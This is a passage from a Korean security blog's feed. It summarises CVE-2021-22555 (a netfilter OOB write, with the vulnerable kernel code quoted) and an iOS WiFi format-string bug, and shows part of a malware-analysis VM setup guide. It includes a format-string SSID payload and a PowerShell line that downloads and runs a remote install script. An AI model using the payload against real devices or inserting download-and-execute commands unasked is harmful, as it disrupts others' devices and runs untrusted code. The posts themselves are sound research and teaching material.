&#xB300;&#xB7B5;&#xC801;&#xC73C;&#xB85C; &#xBB54;&#xC9C0;&#xB294; &#xC54C;&#xC544;&#xC11C; &#xC815;&#xB9AC;&#xD558;&#xB294;&#xAC8C; &#xBB50; &#xADF8;&#xB807;&#xAC8C; &#xC5B4;&#xB835;&#xACA0;&#xC5B4;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xD558; &#xC5ED;&#xC2DC; &#xBB34;&#xC2DD;&#xD558;&#xBA74; &#xC6A9;&#xAC10;&#xD558;&#xB2E4;&#xACE0; &#xBB34;&#xC791;&#xC815; &#xB6F0;&#xC5B4;&#xB4E4;&#xC5C8;&#xB2E4;&#xAC00; &#xB4A4;&#xC9C0;&#xAC8C; &#xCCD0;&#xB9DE;&#xC558;&#xB124;&#xC694;. &#xACF5;&#xBD80;&#xD558;&#xBA74;&#xC11C; &#xB290;&#xB080;&#xAC74;&#xB370; &#xC815;&#xB9D0; &#xACF5;&#xBD80;&#xD560; &#xB0B4;&#xC6A9;&#xC774; &#xB9CE;&#xC740;&#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xB294; &#xC640;&#xC911;&#xC5D0;&#xB3C4; &#xC774;&#xAC70; &#xC880; &#xB354; &#xACF5;&#xBD80;&#xD560;&#xAC78; &#xC800;&#xAC70; &#xC880; &#xB354; &#xACF5;&#xBD80;&#xD560;&#xAC78; &#xD558;&#xB294; &#xC544;&#xC26C;&#xC6C0;&#xC774; &#xC880; &#xB0A8;&#xC544;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC2DC;&#xAC04;&#xC740; &#xC81C;&#xD55C;&#xB418;&#xC5B4; &#xC788;&#xACE0;&#x2026; &#xAE00;&#xC740; &#xC62C;&#xB824;&#xC57C;&#xD558;&#xACE0;&#x2026; &#xC7A0;&#xC744; &#xC880; &#xB354; &#xC904;&#xC5EC;&#xC11C; &#xACF5;&#xBD80; &#xC880; &#xB354; &#xD558;&#xACE0;&#x2026; &#xD574;&#xC57C;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;</p><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xB2E4;&#xC74C; &#xD3B8;&#xC744; &#xC4F0;&#xAE30; &#xC704;&#xD574; &#xB610; &#xACF5;&#xBD80;&#xD558;&#xB7EC; &#xAC00;&#xC57C;&#xACA0;&#xB124;&#xC694;&#x2026; &#xADFC;&#xB370; &#xB098; &#xB2E4;&#xC74C; &#xAE00; &#xC62C;&#xB9B4; &#xC218; &#xC788;&#xACA0;&#xC9C0;&#x2026;?</p><p><img src="/2021/07/21/j0ker/angr_part2/5h1k8f.jpg" alt="./angr_part2/5h1k8f.jpg"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol><li><a href="https://arxiv.org/pdf/1610.00502.pdf">A Survey of Symbolic Execution Techniques</a></li><li><a href="https://www.hahwul.com/2017/06/19/hacking-symbolic-executionsymbolic/">[HACKING] Symbolic Execution(symbolic evaluation)&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;</a></li><li><a href="https://github.com/pwnbatman-joker/awesome-symbolic-execution">Awesome Symbolic Execution</a></li><li><a href="http://www.lazenca.net/pages/viewpage.action?pageId=6324534">03.Symbolic execution(feat.Concrete execution)</a></li><li><a href="http://rosaec.snu.ac.kr/meet/file/20110626o2.pdf">SAT/SMT tutorial SMT &#xD574;&#xACB0;&#xAE30; &#xB0B4;&#xBD80;</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>j0ker</tag>
      
      <tag>angr</tag>
      
      <tag>exploit</tag>
      
      <tag>symbolic_execution</tag>
      
      <tag>newbie</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-22555: Linux Kernel - Netfilter에서 발견된 OOB Write 취약점</title>
    <link href="/2021/07/20/l0ch/2021-07-20/"/>
    <url>/2021/07/20/l0ch/2021-07-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html#exploring-struct-msg_msg">CVE-2021-22555: Turning \x00\x00 into 10000$</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>linux kernel</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB9AC;&#xB205;&#xC2A4; &#xCEE4;&#xB110;&#xC758; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC778; Netfliter&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xAD00;&#xB828; &#xC5F0;&#xC0B0;&#xB4E4;&#xC744; &#xD578;&#xB4E4;&#xB7EC; &#xD615;&#xD0DC;&#xB85C; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; hook&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; Netfilter&#xC758; &#xC11C;&#xBE0C;&#xC2DC;&#xC2A4;&#xD15C; &#xC911; iptables &#xC9C0;&#xC6D0;&#xC744; &#xC704;&#xD55C; <code>IPT_SO_SET_REPLACE</code> &#xB610;&#xB294; <code>IP6T_SO_SET_REPLACE</code>&#xB97C; &#xD638;&#xD658; &#xBAA8;&#xB4DC;&#xB85C; &#xD638;&#xCD9C;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; OOB &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>IPT_SO_SET_REPLACE</code>/<code>IP6T_SO_SET_REPLACE</code> &#xB97C; &#xD638;&#xD658; &#xBAA8;&#xB4DC;&#xB85C; &#xD638;&#xCD9C; &#xC2DC; &#xB124;&#xC774;&#xD2F0;&#xBE0C;&#xB85C; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; userland&#xC5D0;&#xC11C; &#xCEE4;&#xB110;&#xB85C; &#xBCF5;&#xC0AC;&#xD558;&#xBA70; 32bit&#xC5D0;&#xC11C; 64bit&#xB85C; &#xBCC0;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xBCC0;&#xD658; &#xACFC;&#xC815;&#xC758; <code>xt_compat_target_from_user()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">1</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">xt_compat_target_from_user</span><span class="hljs-params">(struct xt_entry_target *t, <span class="hljs-keyword">void</span> **dstptr,</span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-number">2</span><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *size)</span></span><span class="hljs-function">3</span>{<span class="hljs-number">4</span><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_target</span> *<span class="hljs-title">target</span> = <span class="hljs-title">t</span>-&gt;<span class="hljs-title">u</span>.<span class="hljs-title">kernel</span>.<span class="hljs-title">target</span>;</span><span class="hljs-number">5</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">compat_xt_entry_target</span> *<span class="hljs-title">ct</span> = (<span class="hljs-title">struct</span> <span class="hljs-title">compat_xt_entry_target</span> *)<span class="hljs-title">t</span>;</span><span class="hljs-number">6</span><span class="hljs-keyword">int</span> pad, off = xt_compat_target_offset(target);<span class="hljs-number">7</span><span class="hljs-keyword">u_int16_t</span> tsize = ct-&gt;u.user.target_size;<span class="hljs-number">8</span><span class="hljs-keyword">char</span> name[<span class="hljs-keyword">sizeof</span>(t-&gt;u.user.name)];<span class="hljs-number">9</span><span class="hljs-number">10</span>t = *dstptr;<span class="hljs-number">11</span><span class="hljs-built_in">memcpy</span>(t, ct, <span class="hljs-keyword">sizeof</span>(*ct));<span class="hljs-number">12</span><span class="hljs-keyword">if</span> (target-&gt;compat_from_user)<span class="hljs-number">13</span>target-&gt;compat_from_user(t-&gt;data, ct-&gt;data);<span class="hljs-number">14</span><span class="hljs-keyword">else</span><span class="hljs-number">15</span><span class="hljs-built_in">memcpy</span>(t-&gt;data, ct-&gt;data, tsize - <span class="hljs-keyword">sizeof</span>(*ct));<span class="hljs-number">16</span>pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;<span class="hljs-number">17</span><span class="hljs-keyword">if</span> (pad &gt; <span class="hljs-number">0</span>)<span class="hljs-number">18</span><span class="hljs-built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="hljs-number">0</span>, pad);<span class="hljs-number">19</span><span class="hljs-number">20</span>tsize += off;<span class="hljs-number">21</span>t-&gt;u.user.target_size = tsize;<span class="hljs-number">22</span>strlcpy(name, target-&gt;name, <span class="hljs-keyword">sizeof</span>(name));<span class="hljs-number">23</span>module_put(target-&gt;me);<span class="hljs-number">24</span><span class="hljs-built_in">strncpy</span>(t-&gt;u.user.name, name, <span class="hljs-keyword">sizeof</span>(t-&gt;u.user.name));<span class="hljs-number">25</span><span class="hljs-number">26</span>*size += off;<span class="hljs-number">27</span>*dstptr += tsize;<span class="hljs-number">28</span>}</code></pre><p>line 16&#xC5D0;&#xC11C; &#xC815;&#xB82C;&#xB41C; <code>targetsize</code>&#xC758; &#xCC28;&#xC774;&#xB97C; &#xACC4;&#xC0B0;&#xD55C; &#xB4A4; line 18&#xC758; <code>memset()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xACC4;&#xC0B0;&#xB41C; &#xCC28;&#xC774;&#xB9CC;&#xD07C; NULL padding&#xC744; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>target-&gt;targetsize</code> &#xAC00; &#xACE0;&#xB824;&#xB418;&#xC9C0; &#xC54A;&#xC544; &#xD560;&#xB2F9;&#xB41C; &#xD06C;&#xAE30;&#xB97C; &#xB118;&#xC5B4; &#xC778;&#xC811;&#xD55C; &#xAC1D;&#xCCB4;&#xC5D0; NULL&#xC744; &#xC4F8; &#xC218; &#xC788;&#xB294; &#xC81C;&#xD55C;&#xB41C; OOB write&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xBA70; &#xC774;&#xB294; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC774;&#xC804;&#xC5D0; &#xBC1C;&#xACAC;&#xB41C; CVE-2016-3134/CVE-2016-4997&#xC640; &#xC720;&#xC0AC;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>oob</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] IOS wifi RCE 0-day</title>
    <link href="/2021/07/19/fabu1ous/2021-07-19/"/>
    <url>/2021/07/19/fabu1ous/2021-07-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.zecops.com/research/meet-wifidemon-ios-wifi-rce-0-day-vulnerability-and-a-zero-click-vulnerability-that-was-silently-patched/">Meet WiFiDemon &#x2013; iOS WiFi RCE 0-Day Vulnerability, and a Zero-Click Vulnerability That Was Silently Patched</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>iOS 14.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>iOS 14&#xC758; Wi-Fi-Demon&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Format string bug&#xAC00; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACF5;&#xC2DD; &#xACF5;&#xC9C0;&#xC5D0;&#xB294; WiFi DoS&#xB85C; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC; ZecOps Mobile EDR Research&#xC758; &#xBD84;&#xC11D; &#xACB0;&#xACFC;&#xC5D0; &#xB530;&#xB974;&#xBA74; zero-click RCE&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. Wi-Fi-Demon&#xC740; &#xC640;&#xC774;&#xD30C;&#xC774; &#xC5F0;&#xACB0;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; system daemon&#xC73C;&#xB85C; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; sandbox escape &#xBC0F; &#xD0C8;&#xC625;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>%p%s%s%s%s%n</code> &#xACFC; &#xAC19;&#xC774; SSID(&#xC774;&#xB984;)&#xC5D0; format string&#xC774; &#xD3EC;&#xD568;&#xB41C; WiFi&#xC5D0; &#xC811;&#xC18D;&#xD55C;&#xB2E4;&#xBA74; iPhone&#xC758; WiFi &#xBC0F; &#xD56B;&#xC2A4;&#xD31F; &#xAE30;&#xB2A5;&#xC5D0; &#xC601;&#xAD6C;&#xC801;&#xC778; &#xC7A5;&#xC560;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. WiFi-Demon&#xC740; &#xC811;&#xC18D;&#xD55C; WiFi&#xC758; SSID&#xB97C; &#xCE90;&#xC26C; &#xD558;&#xACE0; &#xC7AC;&#xC2DC;&#xC791;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xADF8; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; SSID&#xB97C; &#xC77D;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC7AC;&#xBD80;&#xD305;&#xC744; &#xD574;&#xB3C4; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. WiFi DoS&#xB294; iOS 14.4&#xC5D0;&#xC11C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC; &#xCD5C;&#xC2E0; &#xBC84;&#xC804;&#xC778; 14.6&#xC5D0;&#xC120; &#xC5EC;&#xC804;&#xD788; zero-click RCE&#xB97C; &#xC774;&#xC6A9;&#xD55C; exploit&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>ios</tag>
      
      <tag>wifi</tag>
      
      <tag>dos</tag>
      
      <tag>apple</tag>
      
      <tag>iphone</tag>
      
      <tag>zero-click</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 악성코드 분석용 VM 세팅을 자동화해보자! Part 2</title>
    <link href="/2021/07/18/idioth/setting_malware_vm_part2/"/>
    <url>/2021/07/18/idioth/setting_malware_vm_part2/</url>
    
    <content type="html"><![CDATA[<p><img src="/2021/07/18/idioth/setting_malware_vm_part2/thumbnail.png" alt></p><h1 id="&#xC11C;&#xB860;"><a href="#&#xC11C;&#xB860;" class="headerlink" title="&#xC11C;&#xB860;"></a>&#xC11C;&#xB860;</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. idioth&#xC785;&#xB2C8;&#xB2E4;. &#xC694;&#xC998; &#xB0A0;&#xC528;&#xAC00; &#xB108;&#xBB34; &#xB354;&#xC6CC;&#xC11C; &#xC544;&#xBB34;&#xAC83;&#xB3C4; &#xD558;&#xAE30;&#xAC00; &#xC2EB;&#xB124;&#xC694;&#x2026; COVID-19&#xB3C4; &#xC2EC;&#xD574;&#xC838;&#xC11C; &#xC9D1;&#xC5D0;&#xC11C; &#xACF5;&#xBD80;&#xB97C; &#xD558;&#xACE0; &#xC788;&#xB294;&#xB370; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC744; &#xD558;&#xB824;&#xACE0; &#xBCF4;&#xB2C8; &#xD658;&#xACBD;&#xC774; &#xC138;&#xD305;&#xB41C; &#xAC00;&#xC0C1; &#xBA38;&#xC2E0;&#xC774; &#xC5C6;&#xB124;&#xC694;?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%201.png" alt></p><p>&#xAE09;&#xD558;&#xAC8C; &#xAE54;&#xC544;&#xBC84;&#xB9B0; Windows&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xBB34;&#xAC83;&#xB3C4; &#xC5C6;&#xAD70;&#xC694;. &#xD558;&#xB098;&#xD558;&#xB098; &#xC124;&#xCE58;&#xD558;&#xAE30;&#xAC00; &#xADC0;&#xCC2E;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC800;&#xBC88; &#xC2DC;&#xAC04;&#xC5D0; &#xC6B0;&#xB9AC;&#xAC00; &#xC9C4;&#xD589;&#xD588;&#xB358; &#xAC83;&#xC774; &#xC788;&#xC8E0;? &#xC624;&#xB298;&#xC740; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xC124;&#xCE58; &#xBC0F; &#xBC14;&#xD0D5;&#xD654;&#xBA74; &#xBC14;&#xB85C;&#xAC00;&#xAE30;, &#xC791;&#xC5C5;&#xD45C;&#xC2DC;&#xC904; &#xACE0;&#xC815;&#xC744; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;!!!</p><center><img src="./SeekPng.com_anime-face-png_136767.png" width="50%" height="50%"></center><p>&#xD558;&#xC9C0;&#xB9CC; &#xADF8;&#xAC83;&#xC870;&#xCC28; &#xB108;&#xBB34; &#xD558;&#xAE30;&#xAC00; &#xADC0;&#xCC2E;&#xB124;&#xC694;&#x2026;&#x2026; &#xADF8;&#xB798;&#xB3C4; &#xD55C; &#xBC88; &#xC2DC;&#xC791;&#xD55C; &#xC77C;&#xC740; &#xB9C8;&#xBB34;&#xB9AC; &#xC9C0;&#xC5B4;&#xC57C; &#xD558;&#xB2C8; &#xC2DC;&#xC791;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><h1 id="Chocolatey"><a href="#Chocolatey" class="headerlink" title="Chocolatey"></a>Chocolatey</h1><p>Linux &#xACC4;&#xC5F4; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xC5D0;&#xC11C; &#xC790;&#xB3D9; &#xC124;&#xC815; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xB9CC;&#xB4E4; &#xB54C; &#xD328;&#xD0A4;&#xC9C0; &#xB9E4;&#xB2C8;&#xC800;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; install &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs sql">sudo apm <span class="hljs-keyword">install</span> &lt;<span class="hljs-keyword">package</span>&gt;</code></pre><p>&#xD558;&#xC9C0;&#xB9CC; WIndows Powershell&#xC774;&#xB098; &#xBA85;&#xB839; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xADF8;&#xB7EC;&#xD55C; &#xAE30;&#xB2A5;&#xC774; &#xB531;&#xD788; &#xC0DD;&#xAC01;&#xC774; &#xB098;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xC77C;&#xC774; &#xCC3E;&#xC544;&#xAC00;&#xC11C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB97C; &#xB20C;&#xB7EC; Windows Installer &#xB4F1;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xC124;&#xCE58;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC8E0;.</p><p>&#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC124;&#xCE58;&#xD558;&#xACE0; &#xC2F6;&#xC740; &#xBD84;&#xB4E4;! &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xC790;&#xB3D9;&#xD654;&#xB97C; &#xD558;&#xACE0; &#xC2F6;&#xC740; &#xBD84;&#xB4E4;!&#xC744; &#xC704;&#xD574; Windows&#xC5D0;&#xB294; <a href="https://chocolatey.org/">chocolatey</a>&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%202.png" alt></p><p>chocolatey&#xB294; &#xC6B0;&#xBD84;&#xD22C;&#xC758; apm&#xCC98;&#xB7FC; windows&#xC5D0;&#xC11C; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xBA85;&#xB839;&#xC904;&#xB85C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%203.png" alt></p><p>&#xC138;&#xC0C1;&#xC5D0; &#xADF8;&#xB7FC; &#xC124;&#xCE58;&#xB97C; &#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD560;&#xAE4C;&#xC694;?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%204.png" alt></p><p>&#x2018;Get Started&#x2019;&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC124;&#xCE58;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xB098;&#xC640;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC601;&#xC5B4;&#xB85C; &#xC801;&#xD600; &#xC788;&#xACE0; &#xC0C1;&#xB2F9;&#xD788; &#xAE38;&#xC8E0;? &#xC81C;&#xAC00; &#xC694;&#xC57D;&#xD574;&#xB4DC;&#xB9AC;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. Powershell&#xC744; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD55C; &#xD6C4; <code>Set-ExecutionPolicy Unrestricted</code>(&#xCD94;&#xD6C4; &#xC2E4;&#xD589;&#xD560; &#xC6B0;&#xB9AC;&#xC758; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC704;&#xD568; &#x314E;)&#xB85C; &#xC124;&#xC815;&#xD558;&#xACE0; &#xB2E4;&#xC74C; &#xBA85;&#xB839;&#xC744; &#xBCF5;&#xC0AC;&#xD574; &#xC2E4;&#xD589;&#xD574;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell"><span class="hljs-built_in">Set-ExecutionPolicy</span> Bypass <span class="hljs-literal">-Scope</span> <span class="hljs-keyword">Process</span> <span class="hljs-literal">-Force</span>; [<span class="hljs-type">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span class="hljs-type">System.Net.ServicePointManager</span>]::SecurityProtocol <span class="hljs-operator">-bor</span> <span class="hljs-number">3072</span>; <span class="hljs-built_in">iex</span> ((<span class="hljs-built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="hljs-string">&apos;https://chocolatey.org/install.ps1&apos;</span>))</code></pre><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%205.png" alt></p><p>chocolatey&#xC758; &#xC124;&#xCE58;&#xAC00; &#xC644;&#xB8CC;&#xB418;&#xC5C8;&#xB2E4;&#xBA74; &#xC5B4;&#xB5A4; &#xD328;&#xD0A4;&#xC9C0;&#xAC00; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCFC; &#xC218; &#xC5C6;&#xACA0;&#xC8E0;? Find Packages&#xB97C; &#xD074;&#xB9AD;&#xD558;&#xC5EC; &#xC5B4;&#xB5A4; &#xAC83;&#xB4E4;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%206.png" alt></p><p>8533&#xAC1C;&#xC758; &#xD328;&#xD0A4;&#xC9C0;&#xAC00; &#xC788;&#xB2E4;&#xB124;&#xC694;! ida&#xB3C4; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xC744; &#xD574;&#xBCFC;&#xAE4C;&#xC694;?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%207.png" alt></p><p>IDA free&#xC758; &#xCD5C;&#xC2E0; &#xBC84;&#xC804;&#xC774; &#xC62C;&#xB77C;&#xC640;&#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC0AC;&#xC2E4; &#xCCAB; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD558;&#xACE0; &#xAC8C;&#xC2DC;&#xAE00;&#xC744; &#xC900;&#xBE44;&#xD560; &#xB54C; hex-rays &#xAE30;&#xB2A5;&#xC774; &#xC5C6;&#xB294; IDA&#xB9CC; &#xC5C5;&#xB85C;&#xB4DC;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC11C; &#xD568;&#xC218;&#xB97C; &#xC9DC;&#xC11C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB97C; &#xD558;&#xB3C4;&#xB85D; &#xD558;&#xC600;&#xC73C;&#xB098;&#x2026; &#xAC8C;&#xC2DC;&#xAE00;&#xC744; &#xC62C;&#xB9B4; &#xC2DC;&#xC810;&#xC774; &#xB418;&#xB2C8;&#xAE4C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xAC00; &#xB418;&#xC5B4; &#xC788;&#xB354;&#xB77C;&#xACE0;&#xC694;? &#xD558;&#xD56B;&#x2026;</p><p>&#xC544;&#xBB34;&#xD2BC;! chocolatey&#xB97C; &#xC124;&#xCE58;&#xD558;&#xACE0; &#xB09C; &#xD6C4;&#xC5D0;&#xB294; apm&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xCC98;&#xB7FC; <code>choco install &lt;package&gt;</code>&#xB97C; &#xD1B5;&#xD574; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC138;&#xC0C1;&#xC5D0; &#xB108;&#xBB34; &#xAC04;&#xD3B8;&#xD558;&#xC796;&#xC544;? &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB3C4; &#xB611;&#xAC19;&#xC774; <code>choco upgrade &lt;package&gt;</code>&#xB97C; &#xD1B5;&#xD574; &#xC9C4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694;. chocolatey &#xC790;&#xCCB4;&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD55C;&#xB2E4;&#xBA74; <code>choco upgrade chocolatey</code>&#xB97C; &#xD574;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC124;&#xCE58;&#xB41C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xB4E4;&#xC740; &#xBCF4;&#xD1B5; <code>%ProgramData%\chocolatey\lib</code>&#xC758; &#xD558;&#xC704; &#xD3F4;&#xB354;&#xC5D0; &#xC0DD;&#xC131;&#xB418;&#xB2C8; &#xAE30;&#xC5B5;&#xD574;&#xB450;&#xC138;&#xC694;! (Wireshark, HxD, VSCode &#xB4F1;&#xC740; &#xBCF8;&#xB798;&#xC758; &#xC124;&#xCE58; &#xACBD;&#xB85C;&#xC5D0; &#xC124;&#xCE58;&#xB429;&#xB2C8;&#xB2E4;.)</p><h1 